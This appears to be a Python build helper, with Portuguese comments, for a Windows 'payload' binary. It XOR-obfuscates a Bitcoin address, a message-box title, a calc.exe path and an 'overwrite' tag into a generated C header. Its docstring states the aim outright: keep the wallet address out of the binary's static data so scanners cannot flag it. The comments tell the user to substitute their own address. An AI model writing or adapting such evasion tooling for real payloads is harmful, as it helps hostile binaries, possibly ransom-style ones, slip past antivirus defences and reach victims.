#!/usr/bin/env python3
"""Gera payload/strings.h com as strings ofuscadas (XOR + rotacao por indice).

Motivo: um literal "bc1q..." em .rdata e' assinatura trivial para qualquer
scanner estatico. Aqui o binario carrega apenas bytes XORados; o endereco so'
existe em memoria, em tempo de execucao.
"""

import argparse
import os
import random
import sys


def encode(s: str, key: int):
    raw = s.encode("utf-8")
    return bytes(b ^ ((key + i) & 0xFF) for i, b in enumerate(raw))


def c_array(name: str, data: bytes) -> str:
    body = ", ".join(f"0x{b:02X}" for b in data)
    return f"static const unsigned char {name}[] = {{ {body} }};"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True, help="caminho do strings.h")
    # ATENCAO: endereco ficticio (nao pertence a ninguem). Troque pelo seu:
    #   BTC=bc1... ./build.sh     ou     --addr bc1...
    ap.add_argument(
        "--addr",
        default="bc1q7x9k2m4p8v3n6s1d5f0g2h7j4k9l3m6",
        help="endereco BTC do MessageBox (placeholder por padrao)",
    )
    ap.add_argument("--title", default="obrigado +1")
    ap.add_argument("--calc", default=r"C:\Windows\System32\calc.exe")
    ap.add_argument("--tag", default="overwrite")
    ap.add_argument(
        "--key",
        type=lambda v: int(v, 0),
        default=None,
        help="chave XOR (default: aleatoria por build)",
    )
    args = ap.parse_args()

    key = args.key if args.key is not None else random.randint(0x21, 0x7E)
    items = [
        ("kTag", args.tag),
        ("kCalc", args.calc),
        ("kAddr", args.addr),
        ("kTitle", args.title),
    ]

    lines = [
        "// gerado por tools/gen_secret.py - nao editar",
        "#pragma once",
        "",
        f"static const unsigned char kKey = 0x{key:02X};",
        "",
    ]
    for name, value in items:
        data = encode(value, key)
        lines.append(c_array(name, data))
        lines.append(f"static const unsigned {name}Len = {len(data)}u;")
        lines.append("")

    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))

    print(f"[gen] {args.out}: key=0x{key:02X}, {len(items)} strings")
    return 0


if __name__ == "__main__":
    sys.exit(main())
